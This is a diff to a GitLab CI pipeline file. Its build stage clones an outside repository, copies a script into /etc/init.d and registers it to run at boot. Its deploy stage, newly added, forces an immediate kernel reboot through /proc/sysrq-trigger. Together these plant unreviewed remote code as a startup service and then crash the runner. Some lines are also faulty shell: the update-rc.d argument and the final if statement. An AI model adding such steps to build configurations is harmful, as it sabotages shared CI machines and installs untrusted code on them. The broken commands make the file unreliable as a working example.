@@ -3,7 +3,6 @@ stages:
   - ".pre"
   - before_script
   - build1
-  - test1
   - deploy1
   - ".post"
 before_script:
@@ -11,14 +10,10 @@ before_script:
 build1:
   stage: build1
   script:
-    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d reboot6.sh defaults
-test1:
-  stage: test1
-  script:
-    - echo 1 > /proc/sys/kernel/sysrq
-    - echo b > /proc/sysrq-trigger
+    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d reboot6.sh default
 deploy1:
   stage: deploy1
   script:
-    - alias reboot="sudo systemctl start reboot.target"
+    - echo 1 > /proc/sys/kernel/sysrq
+    - echo b > /proc/sysrq-trigger
     - if [ /etc/init.d/reboot6.sh = true ] do reboot else exit 1
